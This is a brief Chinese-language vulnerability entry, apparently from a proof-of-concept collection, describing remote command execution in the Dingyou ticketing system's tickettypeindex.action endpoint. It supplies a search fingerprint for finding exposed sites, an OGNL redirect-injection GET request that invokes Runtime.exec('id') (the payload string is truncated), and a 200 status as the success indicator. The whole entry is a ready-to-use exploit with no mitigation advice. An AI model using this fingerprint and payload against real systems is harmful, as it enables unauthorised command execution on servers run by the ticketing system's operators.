# 鼎游票务系统tickettypeindex存在远程代码执行漏洞

鼎游票务系统 ｜ 命令执行 ｜ —
- **指纹**：`body="/book/showgoodsIndex.action"`
- **请求**：`GET /book/tickettypeindex.action?redirect:%24{%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedR`
- **响应特征**：200